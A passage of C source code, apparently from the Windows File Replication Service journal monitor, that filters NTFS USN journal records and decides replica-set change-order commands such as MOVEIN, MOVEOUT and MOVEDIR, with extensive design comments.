                            (PCHAR) UsnRecord - (PCHAR) Jbuff->DataBuffer);
                DPRINT1(0, ":U: ERROR -  DataLength: %d\n", Jbuff->DataLength);
                DPRINT(0, ":U: ERROR -  Aborting rest of buffer.\n");

                //
                // Drop Refs and force buffer loop to exit.
                //
                FRS_ASSERT(!"Jrnl monitor: USN Record Inconsistency");
                UsnRecord->RecordLength = (ULONG) DataLength;
                goto SKIP_USN_RECORD;
            }

            RtlMoveMemory (FileName, UsnRecord->FileName, UsnRecord->FileNameLength);
            FileName[UsnRecord->FileNameLength/sizeof(WCHAR)] = UNICODE_NULL;
            DPRINT4(4, "++ NameLen %d  Relative Level %d  Name: %ws\\...\\%ws\n",
                   UsnRecord->FileNameLength, Level, Replica->Root, FileName);


            //
            // Determine if this USN entry is a directory or a file.
            //
            IsDirectory = (FileAttributes & FILE_ATTRIBUTE_DIRECTORY);


            //
            // First handle the case for directories.
            //
            if (IsDirectory) {
                DPRINT(4, "++ FILE IS DIRECTORY -------\n");

                //
                // Level is the relative nesting level of the file in the
                // replica tree.  The immediate children of the root are Level 0.
                // Ignore files at a depth greater than this.
                // A value of one for ReplDirLevelLimit means allow files in
                // the replica root dir only.
                //
                // Note: Add code to handle rename of a dir from excluded to included.
                //       This results in a MOVEDIR Change Order. Not for V1.
                // Ditto for the following - Could be a movedir or movers.
                //
                // Note that a rename of a dir
                // to the bottom level means we delete the subtree because there
                // will be no dirs at the bottom level in the filter table.
                //
                Excluded = (Level >= (ConfigRecord->ReplDirLevelLimit-1));

                if (Excluded && CO_NEW_FILE(LocationCmd)) {
                    DPRINT(4,"++ directory exceeds depth limit.  Excluded\n");
                    goto SKIP_USN_RECORD;
                }

                //
                // See if the name is on the exclusion filter list.
                //
                if (!IsListEmpty(&Replica->DirNameFilterHead)) {

                    FrsSetUnicodeStringFromRawString(&TempUStr,
                                                      UsnRecord->FileNameLength,
                                                      UsnRecord->FileName,
                                                      UsnRecord->FileNameLength);

                    LOCK_REPLICA(Replica);
                    Excluded = FrsCheckNameFilter(&TempUStr, &Replica->DirNameFilterHead);
                    //
                    // Not excluded if it's on the included list.
                    //
                    if (Excluded &&
                        FrsCheckNameFilter(&TempUStr, &Replica->DirNameInclFilterHead)) {
                        Excluded = FALSE;
                    }
                    UNLOCK_REPLICA(Replica);

                    if (Excluded && CO_NEW_FILE(LocationCmd)) {
                        DPRINT(4,"++ directory name filter hit.  Excluded\n");
                        goto SKIP_USN_RECORD;
                    }
                }

                //
                // Generate the change orders as we update the filter table.
                //
                DPRINT2(4,"++ DIR location cmd on: %ws\\...\\%ws\n",
                        Replica->Root, FileName);

                JrnlFilterUpdate(Replica,
                                 UsnRecord,
                                 LocationCmd,
                                 PrevParentFilterEntry,
                                 CurrParentFilterEntry);

            } else {


                //
                // Handle the files here.
                //
                // Evaluate the excluded state if this is a file.
                // Files are allowed at the bottom level.
                //
                Excluded = (Level >= ConfigRecord->ReplDirLevelLimit);

                //
                // NOTE: Treat Movedir or movers that is > depth limit as moveout.
                //
                if (Excluded && CO_NEW_FILE(LocationCmd)) {
                    DPRINT(4,"++ Filter depth exceeded.  File excluded\n");
                    goto SKIP_USN_RECORD;
                }



                // Note: Add code to handle rename of file from excluded to included.
                //
                // Excluded file check:
                //
                // 1. If this is a create or MOVEIN of a file with an
                // excluded name then just ignore the USN record.
                //
                // 2. If this is a rename of an excluded file to a visible
                // file then generate a MOVEIN change order for the file.
                //
                // 3. If the file is not in our tables then it must not
                // be visible so ignore it.  Note that changing the
                // exclusion list by removing an element will not by itself
                // make those files visible.  A rename operation is still
                // needed to get the file into our tables.
                //
                // 4. A rename of a visible file to an excluded file does
                // not make the file excluded since it is still in our tables
                // and present in all replicas.  Only a delete or a rename
                // of the file to a point outside the replica set will remove
                // the file from our tables and all other replicas.
                //
                // 5. The addition of an element to the exclusion list only
                // affects future creates. It has no affect on previous
                // file creates that generated an entry in our tables.
                //

                //
                // See if the name is on the exclusion filter list.
                //
                if (!IsListEmpty(&Replica->FileNameFilterHead)) {

                    FrsSetUnicodeStringFromRawString(&TempUStr,
                                                      UsnRecord->FileNameLength,
                                                      UsnRecord->FileName,
                                                      UsnRecord->FileNameLength);

                    LOCK_REPLICA(Replica);
                    Excluded = FrsCheckNameFilter(&TempUStr, &Replica->FileNameFilterHead);
                    //
                    // Not excluded if it's on the included list.
                    //
                    if (Excluded &&
                        FrsCheckNameFilter(&TempUStr, &Replica->FileNameInclFilterHead)) {
                        Excluded = FALSE;
                    }
                    UNLOCK_REPLICA(Replica);

                    if (Excluded && CO_NEW_FILE(LocationCmd)) {
                        DPRINT(4,"++ File name filter hit.  Excluded\n");
                        goto SKIP_USN_RECORD;
                    }
                }

                //
                // Looks like this file is real.  See if we have a change order
                // pending for it.  If so update it, if not, alloc a new one.
                //
                WStatus = JrnlEnterFileChangeOrder(UsnRecord,
                                                   LocationCmd,
                                                   PrevParentFilterEntry,
                                                   CurrParentFilterEntry);
                if (!WIN_SUCCESS(WStatus)) {
                    DPRINT(0, "++ ERROR - Change order create or update failed\n");
                }
            }

            //
            // Increment the UsnRecords Accepted counter
            //
            PM_INC_CTR_REPSET(Replica, UsnRecAccepted, 1);
            goto ACCEPT_USN_RECORD;

SKIP_USN_RECORD:
            //
            // Increment the UsnRecordsRejected counter
            //
            PM_INC_CTR_SERVICE(PMTotalInst, UsnRecRejected, 1);

ACCEPT_USN_RECORD:
            //
            // Release the references on the prev and current parent filter
            // entries that were acquired by JrnlGetFileCoLocationCmd().
            //
            if (PrevParentFilterEntry != NULL) {
                GhtDereferenceEntryByAddress(pVme->FilterTable,
                                             PrevParentFilterEntry,
                                             TRUE);
                PrevParentFilterEntry = NULL;
            }

            if (CurrParentFilterEntry != NULL) {
                GhtDereferenceEntryByAddress(pVme->FilterTable,
                                             CurrParentFilterEntry,
                                             TRUE);
                CurrParentFilterEntry = NULL;
            }



            //
            // This has to be done after processing the record so if a
            // save mark were to happen at the same time we wouldn't
            // erroneously filter out the record above when the CurrentUsn
            // is compared with Replica->LastUsnProcessed.
            //
            UpdateCurrentUsnRecordDone(pVme, CurrentUsn);

            //
            // If we are out of Replay mode for this replica and the
            // replica is active then advance our Journal progress
            // point, Replica->LastUsnRecordProcessed.
            //
            if ((Replica != NULL) &&
                (Replica->ServiceState == REPLICA_STATE_ACTIVE) &&
                !REPLICA_REPLAY_MODE(Replica, pVme)) {

                AcquireQuadLock(&pVme->QuadWriteLock);
                Replica->LastUsnRecordProcessed = CurrentUsn;
                ReleaseQuadLock(&pVme->QuadWriteLock);
            }

NEXT_USN_RECORD:

            //
            // Advance to next USN Record.
            //
            DataLength -= UsnRecord->RecordLength;
            UsnRecord = (PUSN_RECORD)((PCHAR)UsnRecord + UsnRecord->RecordLength);

        }  // end while(DataLength > 0)
        //DPRINT1(5, "jb: tf %08x\n", Jbuff);
        FrsRtlInsertTailQueue(&JournalFreeQueue, &Jbuff->ListEntry);

    }  // end while(TRUE)


    //
    // Get exception status.
    //
    } except (EXCEPTION_EXECUTE_HANDLER) {
        GET_EXCEPTION_CODE(WStatus);
    }


    } finally {

        if (WIN_SUCCESS(WStatus)) {
            if (AbnormalTermination()) {
                WStatus = ERROR_OPERATION_ABORTED;
            }
        }

        DPRINT_WS(0, "Journal Monitor thread finally.", WStatus);

        //
        // Trigger FRS shutdown if we terminated abnormally.
        //
        if (!WIN_SUCCESS(WStatus) && (WStatus != ERROR_PROCESS_ABORTED)) {
            DPRINT(0, "Journal Monitor thread terminated abnormally, forcing service shutdown.\n");
            FrsIsShuttingDown = TRUE;
            SetEvent(ShutDownEvent);
        } else {
            WStatus = ERROR_SUCCESS;
        }

        //
        // Cleanup all the storage.
        //
        DPRINT1(3, ":S: T E R M I N A T I N G -- %s\n", DEBSUB);

        JournalMonitorShutdown();

        if (HANDLE_IS_VALID(JournalReadThreadHandle)) {
            WStatus = WaitForSingleObject(JournalReadThreadHandle, 10000);
            CHECK_WAIT_ERRORS2(3, WStatus, 1);

            if (WIN_SUCCESS(WStatus)) {
                DPRINT(4, ":S: Journal Read thread terminated.\n");
            }

        } else {
            DPRINT(4, ":S: Journal Read thread terminate - NULL Handle\n");
        }

        DPRINT(0, ":S: Journal is exiting.\n");
        DPRINT1(4, ":S: ThSupSubmitThreadExitCleanup(ThisFrsThreadCtx) - %08x\n", ThisFrsThreadCtx);
        ThSupSubmitThreadExitCleanup(ThisFrsThreadCtx);
    }

    return WStatus;
}


LONG
JrnlGetFileCoLocationCmd(
    PVOLUME_MONITOR_ENTRY     pVme,
    IN PUSN_RECORD            UsnRecord,
    OUT PFILTER_TABLE_ENTRY  *PrevParentFilterEntry,
    OUT PFILTER_TABLE_ENTRY  *CurrParentFilterEntry
 )
/*++

Routine Description:

    Given the Reason mask and the current parent file ID in the USN record
    and the previous parent File ID determine the location command for the
    change order.  The volume filter table is used to check the presence of
    the parent directories in a replica set and to check if the file has
    moved between two replica sets.

    There are 5 cases shown in the table below.  A lookup is done for each File
    ID in the Filter table and these results are tested to generate the change
    order location command value.  (M: lookup miss, H: lookup hit).  See
    comments elsewhere for outcome defs.


            Prev    Curr    Prev &
            Parent  Parent  New
            FID     FID     Parent R.S.
    Case    Lookup  Lookup  Match      Outcome

     0        M       M      -         FILE_NOT_IN_REPLICA_SET

     1        M       H      -         MOVEIN

     2        H       M      -         MOVEOUT (a)

     3        H       H      No        (a), MOVERS, NAMECHANGE

     4        H       H      Yes       MOVEDIR, NAMECHANGE


    (a) The parent FID could be in the replica set while the File/Dir FID isn't
    if a subtree enum by the update process hasn't reached the File/Dir FID yet
    (MOVEIN on parent followed by MOVOUT on child) or,

    The child was excluded and now its name is changing to allow inclusion.
    In this case the rename includes a name change so the file is no
    longer excluded.

    During subtree operations filter table lookups must be blocked or races
    causing invalid states will occur.


  1. MOVEIN - Rename of a directory into a replica set.  The lookup failed on
     the previous parent FID but the current parent FID is in the table.  We
     add an entry for this DIR to the filter table.  The update process must
     enumerate the subtree on disk and evaluate each file for inclusion into
     the tree, updating the Filter table as it goes.  We may see file
     operations several levels down from the rename point and have no entry in
     the Filter Table so we pitch those records.  The sub-tree enumeration
     process must handle this as it incorporates each file into the IDTable.

  2. MOVEOUT - Parent FID change to a dir OUTSIDE of any replica set on the
     volume.  This is a delete of an entire subtree in the Replica set.  We
     enumerate the subtree bottom-up, sending dir level change orders to the
     update process as we delete the filter table entries.

  3. Name change only.  The current Parent FID in the USN record matches the
     Parent FID in the Filter entry for the file or directory.  Update the name
     in the filter entry.

  4. MOVEDIR - previous Parent FID is different from the current parent FID.
     Both are in the Filter table with the same replica set.  This is a rename
     to a dir in the SAME replica set.  Update the parent FID in the filter
     enty and Filename too.

  5. MOVERS - The previous Parent FID is different from the current parent File
     ID.  Both are in the Filter Table but they have DIFFERENT replica set IDs.
     Update the parent FID, the replica ptr, and name in the filter entry.  This
     is a move of an entire subtree from one replica set to another.  We
     enumerate the subtree top-down, sending dir level change orders to the
     update process as we update the replica set information in the filter table
     entries.


Arguments:

    pVme - ptr to the Volume monitor entry for the parent file ID and
           Volume Filter tables.

    UsnRecord - ptr to the UsnRecord.

    PrevParentFilterEntry = return value for the previous parent filter entry
                            or null.  This is the parent under which
                            the file or dir used to reside.

    CurrParentFilterEntry = return value for the current parent filter entry
                            or null.  This is the parent under which the file
                            or dir currently resides.

    NOTE: The caller must decrement the ref counts on the previous and new parent
    filter entries if either is returned non null.

    The table below summarizes the filter entry return values for previous
    and current filter entry.  A NULL ptr is returned in the 'No' cases.
    It is the callers job to decrement the reference count on the filter
    entry when a non=null value is returned.

                                          Result returned in

                             PrevParentFilterEntry   CurrParentFilterEntry
    File Not in Replica Set           No                    No
    File content Change               No                    Yes
    create                            No                    Yes
    delete                            No                    Yes
    Movein                            No                    Yes
    MoveOut                           Yes                   No
    MoveDir                           Yes                   Yes
    MoveRS                            Yes                   Yes


Return Value:

    The change order location comand or FILE_NOT_IN_REPLICA_SET.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlGetFileCoLocationCmd:"

    ULONG Reason;
    PGENERIC_HASH_TABLE FilterTable;

    PULONGLONG CurrParentFileID;
    ULONGLONG  PrevParentFileID;
    PULONGLONG FileID;

    ULONG_PTR Flags;
    ULONG GStatus;
    BOOL PrevParentExists;

    *PrevParentFilterEntry = NULL;
    *CurrParentFilterEntry = NULL;

    //
    // The code below checks for USN records with USN_SOURCE_REPLICATION_MANAGEMENT
    // SourceInfo flag set.  Currently we check for this bit for consistency
    // with the state in our write filter table.  A warning is generated
    // when we get a mismatch.  Eventually we need to remove the write filter
    // hash table and just rely just on the above flag.
    // It also tells us to skip our own records during recovery.
    //
    // First check if it's in the USN filter hash table.  If so this is one of
    // our own install writes (FrsCloseWithUsnDampening did the close)
    // so skip the journal record and delete the table entry.
    //
    GStatus = QHashLookup(pVme->FrsWriteFilter,
                          &UsnRecord->Usn,
                          &PrevParentFileID,  // unused result
                          &Flags);            // unused result

    if (GStatus == GHT_STATUS_SUCCESS) {
        DUMP_USN_RECORD(4, UsnRecord);
        DPRINT1(4, "++ USN Write filter cache hit on usn %08x %08x  -- skip record\n",
               PRINTQUAD(UsnRecord->Usn));

        //
        // Some code is closing the handle with usn dampening but did
        // not mark the handle as being managed by ntfrs.
        //
        if (!BooleanFlagOn(UsnRecord->SourceInfo, USN_SOURCE_REPLICATION_MANAGEMENT)) {
            DPRINT2(4, "++ WARN Source not set; usn dampen: SourceInfo is %08x for %08x %08x\n",
                    UsnRecord->SourceInfo, PRINTQUAD(UsnRecord->FileReferenceNumber));
        }

        return FILE_NOT_IN_REPLICA_SET;
    }

    //
    // Maybe recovery usn record but spit out a warning anyway. In
    // general, usn records with USN_SOURCE_REPLICATION_MANAGEMENT set should have been
    // closed with usn dampening and filtered out above.
    //
    if (BooleanFlagOn(UsnRecord->SourceInfo, USN_SOURCE_REPLICATION_MANAGEMENT)) {
        DPRINT2(4, "++ WARN Source set; no usn dampen: SourceInfo is %08x for %08x %08x\n",
                UsnRecord->SourceInfo, PRINTQUAD(UsnRecord->FileReferenceNumber));
    }

    //
    // Ignore the usn records generated by the service
    //
    // Note: get rid of writefilter and use SourceInfo always!
    //
    Reason = UsnRecord->Reason;
    if (BooleanFlagOn(UsnRecord->SourceInfo, USN_SOURCE_REPLICATION_MANAGEMENT)) {
        if (Reason & USN_REASON_FILE_DELETE) {
            DPRINT1(4, "++ Process service generated usn record for %08x %08x\n",
                    PRINTQUAD(UsnRecord->FileReferenceNumber));
        } else {
            DUMP_USN_RECORD(4, UsnRecord);
            DPRINT1(4, "++ Ignore service generated usn record for %08x %08x\n",
                    PRINTQUAD(UsnRecord->FileReferenceNumber));
            return FILE_NOT_IN_REPLICA_SET;
        }
    }

#ifdef RECOVERY_CONFLICT
    //
    // If a recovery conflict table exists check for a match and skip the USN
    // record.  This filters out any USN records caused by our own activities
    // at the time of the crash.
    //
    if (pVme->RecoveryConflictTable != NULL) {
        //
        // Once we pass the journal recovery end point delete the table.
        // It can not have any entries with a larger USN than the end point.
        //     ("how can we be sure that all replica sets on this volume have"
               "actually started and so have actually finished using the"
               "conflict table?")
        //
        if (UsnRecord->Usn > pVme->JrnlRecoveryEnd) {
            pVme->RecoveryConflictTable = FrsFreeType(pVme->RecoveryConflictTable);
        } else {
            GStatus = QHashLookup(pVme->RecoveryConflictTable,
                                  &UsnRecord->FileReferenceNumber,
                                  &PrevParentFileID,  // unused result
                                  &Flags);            // unused result

            if (GStatus == GHT_STATUS_SUCCESS) {
                DUMP_USN_RECORD(1, UsnRecord);
                DPRINT1(1, "++ Recovery conflict table hit on FID %08x %08x  -- skip record\n",
                       PRINTQUAD(UsnRecord->FileReferenceNumber));
                return FILE_NOT_IN_REPLICA_SET;
            }
        }
    }
#endif  // RECOVERY_CONFLICT

    FilterTable = pVme->FilterTable;

    //
    // Get the previous parent file ID for this file/Dir.
    //
    FileID = &UsnRecord->FileReferenceNumber;
    CurrParentFileID = &UsnRecord->ParentFileReferenceNumber;

    GStatus = QHashLookup(pVme->ParentFidTable, FileID, &PrevParentFileID, &Flags);
    PrevParentExists = (GStatus == GHT_STATUS_SUCCESS);

    //
    // Check to see if we still need to special case any operations on the root
    // dir of a replica set.
    //
    if (PrevParentExists) {
        DPRINT2(5, "++ Fid: %08x %08x   PrevParentFid: %08x %08x\n",
                      PRINTQUAD(UsnRecord->FileReferenceNumber),
                      PRINTQUAD(PrevParentFileID));

        //
        // IF the previous parent FID is not in the Filter table now and this
        // is not a rename operation (which might result in a MOVEIN) then this
        // file is not in a replica set.  This case occurs after a MOVEOUT of a
        // parent dir followed by some access to a child.
        //
        GStatus = GhtLookup(FilterTable, &PrevParentFileID, TRUE, PrevParentFilterEntry);
        if ((GStatus != GHT_STATUS_SUCCESS) &&
            ((Reason & USN_REASON_RENAME_NEW_NAME) == 0)) {
            DUMP_USN_RECORD(4, UsnRecord);
            DPRINT(4, "++ NOT IN RS - Entry in Parent File ID table but not FilterTable & not rename.\n");
            return FILE_NOT_IN_REPLICA_SET;
        }
    } else {
        //
        // There is no entry in the parent file ID table for this file or dir.
        // If there is no entry in the filter table for the file's current
        // parent then the file is not in any replica set.
        //
        GStatus = GhtLookup(FilterTable, CurrParentFileID, TRUE, CurrParentFilterEntry);
        if (GStatus != GHT_STATUS_SUCCESS) {
            DUMP_USN_RECORD(4, UsnRecord);
            DPRINT(4, "++ NOT IN RS - Entry not in Parent File ID table or FilterTable.\n");
            return FILE_NOT_IN_REPLICA_SET;
        }
    }

    //
    // A delete has to have an entry in the parent File ID table or it is not
    // in a replica set.
    //
    if (Reason & USN_REASON_FILE_DELETE) {
        //
        // If the Previous parent filter entry is valid then the file/dir
        // was in a replica set so treat it as a delete.
        //
        if (*PrevParentFilterEntry != NULL) {
            *CurrParentFilterEntry = *PrevParentFilterEntry;
            *PrevParentFilterEntry = NULL;
            return CO_LOCATION_DELETE;
        }
        //
        // It wasn't in the parent fid table so either the rename flag is also
        // set or the current parent filter entry is non-null which would be
        // the case for a delete on an excluded file.  Either way skip it.
        //
        DUMP_USN_RECORD(4, UsnRecord);
        DPRINT(4, "++ NOT IN RS - delete on excluded file?\n");
        return FILE_NOT_IN_REPLICA_SET;
    }

    //
    // A create has to have an entry for its parent in the Volume Filter Table
    // or it is not in a replica set.  It must have no prior entry in the Parent
    // file ID table.  (FILE IDs are unique).
    //
    if (Reason & USN_REASON_FILE_CREATE) {
        //
        // If the USN from the journal record is less than or equal to the USN
        // from the file when the replica tree load was done then the created
        // file was already picked up by the load.  Otherwise it is an error
        // because we should not have had an entry in the parent ID table yet.
        // At this point we do not have the current USN on the file so we will
        // assume that if a previous parent exists the load got there first and
        // this journal record is stale (so skip the record).
        //
        // In the case where we have paused the journal to startup another
        // replica set we may have to move the next USN to read from the journal
        // back to let this new RS catch-up.  In that case we will be seeing
        // records for a second time.  If we are in replay mode and the USN
        // for this record is less than the LastUsnRecordProcessed for the target replica
        // set then we ignore the record.
        //
        // Note: add above file usn check.
        //
        if (PrevParentExists) {
            DUMP_USN_RECORD(4, UsnRecord);
            DPRINT(4, "++ NOT IN RS \n");
            return FILE_NOT_IN_REPLICA_SET;
        }
        return CO_LOCATION_CREATE;
    }
    //
    // If not a rename then no location change, but this file is in a Replica Set.
    //
    if ((Reason & USN_REASON_RENAME_NEW_NAME) == 0) {

        //
        // Check for a content update to a file that is not in our tables.
        // It could be an excluded file which gets filtered out later.
        // Or an excluded file that is no longer excluded because the
        // the exclusion list changed.
        // Treat it as a create so we check the exclusion list again
        // and set the USN record create flag for others that may look at it.
        //
        if (*CurrParentFilterEntry != NULL) {
            //UsnRecord->Reason |= USN_REASON_FILE_CREATE;
            //return CO_LOCATION_CREATE;
            //
            // Treat it as a MOVEIN since if it is a directory we need to
            // enumerate the children.
            //
            return CO_LOCATION_MOVEIN;
        }

        //
        // It's not a rename, CurrParentFilterEntry is NULL so to be here
        // PrevParentFilterEntry must be non-null which means that this is
        // a content update to a file we already know about.
        //
        FRS_ASSERT(*PrevParentFilterEntry != NULL);
        *CurrParentFilterEntry = *PrevParentFilterEntry;
        *PrevParentFilterEntry = NULL;
        return CO_LOCATION_NO_CMD;
    }

    //
    // Handle file rename cases.  If parent FileIDs match then no location change.
    //
    if ((*PrevParentFilterEntry != NULL) &&
        (PrevParentFileID == *CurrParentFileID)) {
        *CurrParentFilterEntry = *PrevParentFilterEntry;
        *PrevParentFilterEntry = NULL;
        return CO_LOCATION_NO_CMD;
    }

    //
    // Old and new parent file IDs are different. So the file/dir moved across
    // directories.  Could be MOVEIN, MOVEOUT, MOVEDIR, MOVERS.
    //
    if (*CurrParentFilterEntry == NULL) {
        GhtLookup(FilterTable, CurrParentFileID, TRUE, CurrParentFilterEntry);
    }


    if (*PrevParentFilterEntry != NULL) {
        if (*CurrParentFilterEntry != NULL) {

            //
            // Old and new parents in table.
            //
            if ((*PrevParentFilterEntry)->Replica ==
                (*CurrParentFilterEntry)->Replica) {
                //
                // Old and New Replica Sets are the same  ==> MOVEDIR
                //
                return CO_LOCATION_MOVEDIR;
            } else {
                //
                // Old and New Replica Sets are different ==> MOVERS
                //
                return CO_LOCATION_MOVERS;
            }

        } else {
            //
            // Old parent in table, new parent not in table ==> MOVEOUT
            //
            return CO_LOCATION_MOVEOUT;
        }

    } else {

        if (*CurrParentFilterEntry != NULL) {
            //
            // Old parent not in table, new parent is in table ==> MOVEIN
            //
            return CO_LOCATION_MOVEIN;
        } else {
            //
            // To get here the operation must be a rename on a file/dir
            // that was in the parent file ID table but the previous parent
            // File ID is no longer in the Filter table (MOVEOUT).  In addition
            // the current parent File ID is not in the filter table.  So this
            // is a rename operation on a file that was in a replica set in the
            // past but is not currently in any replica set.  The update process
            // will eventually clean out the stale entries in the parent file
            // ID table.
            //
            DUMP_USN_RECORD(4, UsnRecord);
            DPRINT(4, "++ NOT IN RS - Rename on a file with a MOVEOUT parent.\n");
            return FILE_NOT_IN_REPLICA_SET;
        }
    }

    DUMP_USN_RECORD(4, UsnRecord);
    DPRINT(4, "++ NOT IN RS\n");

    return FILE_NOT_IN_REPLICA_SET;
}




ULONG
JrnlEnterFileChangeOrder(
    IN PUSN_RECORD          UsnRecord,
    IN ULONG                LocationCmd,
    IN PFILTER_TABLE_ENTRY  OldParentFilterEntry,
    IN PFILTER_TABLE_ENTRY  NewParentFilterEntry
    )
/*++

Routine Description:

    Enter a new change order or update an exisitng change order.
    This routine is for FILES ONLY.  Directories are handled in
    JrnlFilterUpdate().

    This routine acquires and releases the locks on both the source and target
    replica set change order lists (in the case of a MOVERS).

    Assumes The caller has taken references on the old and new parent filter entry.

Arguments:

    UsnRecord - ptr to the UsnRecord.
    LocationCmd - The change order location command. (MOVEIN, MOVEOUT, ...)
    OldParentFilterEntry - The filter entry for the file's previous parent.
    NewParentFilterEntry - The filter entry for the file's current parent.

Return Value:

    Win32 status.

--*/
{
#undef DEBSUB
#define DEBSUB  "JrnlEnterFileChangeOrder:"

    ULONG               GStatus;
    ULONG               WStatus = ERROR_GEN_FAILURE;
    PULONGLONG          FileID;
    ULONGLONG           OriginalParentFileID;
    PCHANGE_ORDER_ENTRY ChangeOrder;
    PGENERIC_HASH_TABLE ChangeOrderTable;
    PREPLICA            CurrentReplica;
    PREPLICA            OriginalReplica;
    PFILTER_TABLE_ENTRY OriginalParentFilterEntry;
    BOOL                PendingCo;
    ULONG               StreamSequenceNumber;
    BOOL                MergeOk;
    PCXTION             Cxtion;
    UNICODE_STRING      UnicodeStr, UnicodeStr2;
    PVOLUME_MONITOR_ENTRY pVme;
    PUSN_RECORD         OldRenUsnRec;


    //
    // Determine the original parent and replica set if the file has moved around.
    // This determines what change order table we need to examine for a pending
    // change order.
    // Note: Now that we have one change order table per volume, is this still needed?
    //
    if (CO_MOVE_OUT_RS_OR_DIR(LocationCmd)) {
        OriginalParentFilterEntry = OldParentFilterEntry;
    } else {
        OriginalParentFilterEntry = NewParentFilterEntry;
        if (NewParentFilterEntry->DFileID != UsnRecord->ParentFileReferenceNumber) {
            DPRINT(4, "++ Warn - Current parent FID NOT EQUAL to UsnRecord.parentFiD -- Stale USN Rec???\n");
            DPRINT2(4, "++ %08x %08x   --   %08x %08x\n",
                    PRINTQUAD(NewParentFilterEntry->DFileID),
                    PRINTQUAD(UsnRecord->ParentFileReferenceNumber));
            return ERROR_INVALID_PARAMETER;
        }
    }

    OriginalReplica = OriginalParentFilterEntry->Replica;
    OriginalParentFileID = OriginalParentFilterEntry->DFileID;

    pVme = OriginalReplica->pVme;
    ChangeOrderTable = pVme->ChangeOrderTable;

    CurrentReplica = (NewParentFilterEntry != NULL) ?
                      NewParentFilterEntry->Replica :
                      OldParentFilterEntry->Replica;

    FrsRtlAcquireListLock(&pVme->ChangeOrderList);

    //
    // Make a new stream sequence number.  Protected by above list lock.
    //
    StreamSequenceNumber = ++pVme->StreamSequenceNumber;

    //
    // See if there is a pending change order for this file/dir.  The call to
    // JrnlUpdateChangeOrder() drops our reference on the change order.
    //
    FileID = &UsnRecord->FileReferenceNumber;
    GStatus = GhtLookupNewest(ChangeOrderTable, FileID, TRUE, &ChangeOrder);

    PendingCo = (GStatus == GHT_STATUS_SUCCESS);


    if (PendingCo) {
        //
        // There is a pending change order.  Do a couple consistency checks.
        //
        // This USN record should not be for a file create because that
        // would generate a new File ID which should NOT be in the table.
        //
        // NOT QUITE TRUE -- JrnlGetFileCoLocationCmd() will turn on the
        // USN create flag if it sees a file is in the replica set but not
        // in the parent file ID table.  This happens when a file that was on
        // the exclusion list is updated after the exclusion list is changed
        // to allow the file to be included.  Because of this situation we can
        // also see the create flag set when the following occurs:
        //  1. A series of file changes result in two COs being produced
        //     because the first CO is pulled off the process queue.
        //  2. Subsequent file changes are accumulated in the 2nd CO.
        //  3. Meanwhile the user deletes the file so the first CO aborts when
        //     it can't generate the staging file.  As part of this abort the
        //     IDTable entry for the "new" file is deleted and the ParentFidTable
        //     entry is removed.
        //  4. Now another USN record for the file (not the delete yet) arrives
        //     to merge with the 2nd CO under construction.  Since we don't yet
        //     know a delete is coming the code in JrnlGetFileCoLocationCmd()
        //     sets the USN create flag as described above.
        //  5. Now we end up here and hit the assert.  So to avoid this we check
        //     the Pending CO and only assert if is already a create.
        //
        // Yea, yea I could just bag the assert but the above scenario is instructive.
        //
        if ((LocationCmd == CO_LOCATION_CREATE) &&
            (GET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command) == CO_LOCATION_CREATE)){
            DUMP_USN_RECORD2(0, UsnRecord, OriginalReplica->ReplicaNumber, LocationCmd);
            DPRINT(0, "++ ERROR -- USN_REASON_FILE_CREATE with create change order in the table:\n");
            FRS_PRINT_TYPE(0, ChangeOrder);
            FRS_ASSERT(!"JrnlEnterFileCO: USN_REASON_FILE_CREATE with create change order in table");
            goto RETURN;
        }

        //
        // If the pending change order is a delete and the USN record
        // specifies the same same FID this is an error because
        // delete will have retired the FID.
        //
        if (GET_CO_LOCATION_CMD(ChangeOrder->Cmd, Command) == CO_LOCATION_DELETE){
            DUMP_USN_RECORD2(0, UsnRecord, OriginalReplica->ReplicaNumber,
                             CO_LOCATION_DELETE);
            DPRINT(0, "++ ERROR - new USN record follows delete with same FID");
            FRS_PRINT_TYPE(0, ChangeOrder);
            FRS_ASSERT(!"JrnlEnterFileCO: new USN record follows delete with same FID");
            goto RETURN;
        }

        //
        // USN MERGE RESTRICTIONS:
        //
        // Check if this USN record can be merged with the pending change order.
        // If this USN record is a delete or a rename then it removes a name
        // from the name space.  If there exists a more recent change order
        // that references this name then we can not merge the USN record.
        // Instead we must create a new CO.
        //
        // Consider this sequence:
        //  Attrib -r Dir                 <== creates CO-1
        //  Del  Dir\Foo                  <== creates CO-2
        //  Del  Dir                      <== Merge with CO-1 causes name conflict.
        //
        // The "Del Dir" CO can't be merged with CO-1 because CO-2 is still
        // using Dir to delete file Foo.  If the merge were to take place the
        // delete would fail since Dir is not empty.  File Dir\Foo would be
        // deleted but Dir would be left around.
        //
        // Similarly a rename creates a new name in the name space but if there
        // is a more recent CO that references the name then the rename can't
        // be merged.
        //
        // Consider the following sequence: (Bar already exists)
        //  Echo TestString > Foo         <== creates CO-1
        //  Ren  Bar  Bar2                <== creates CO-2
        //  Ren  Foo  Bar                 <== Merge with CO-1 causes name conflict.
        //
        // Foo and Bar are different COs on different Fids but they have
        // name space dependencies that prevent merging the Foo rename with
        // CO-1 that does the file update.  If we did merge these two COs then
        // the resulting remote CO that is sent out would collide with the
        // pre-existing Bar, thus deleting it.  When CO-2 arrived the original
        // Bar would be gone so there would be no Bar2.
        //

        MergeOk = TRUE;

        if (MergeOk &&
            CurrentReplica &&
            (Cxtion = GTabLookup(CurrentReplica->Cxtions,
                                 &CurrentReplica->JrnlCxtionGuid,
                                 NULL)) &&
             !GUIDS_EQUAL(&ChangeOrder->JoinGuid, &Cxtion->JoinGuid)) {
                MergeOk = FALSE;
                CHANGE_ORDER_TRACE(3, ChangeOrder, "Invalid join guid Merge NOT OK ");
        }

        //
        // When we see USN_REASON_REPARSE_POINT_CHANGE it could indicate
        // addition or removal of the reparse point as well as just a
        // modification. One problem we can hit is when you remove the reparse
        // point and then immediately delete the file. If these operations get
        // merged then we will only see the delete on the other end.
        // Unfortunately, when we try to delete the file on the other member we
        // may fail. For example, DFS always returns an error when you access a
        // file with a DFS reparse point on it.
        //
        // What we really want to do is prevent merging a removal of a reparse
        // point with a later operation on the file. Since there is no way to
        // differentiate the kinds of reparse point changes we just prevent
        // merging any of them with later non reparse point changes.
        //
        // It is okay to merge a non reparse point change with a later reparse
        // point change.
        //

        if(BooleanFlagOn(ChangeOrder->Cmd.ContentCmd, USN_REASON_REPARSE_POINT_CHANGE) &&
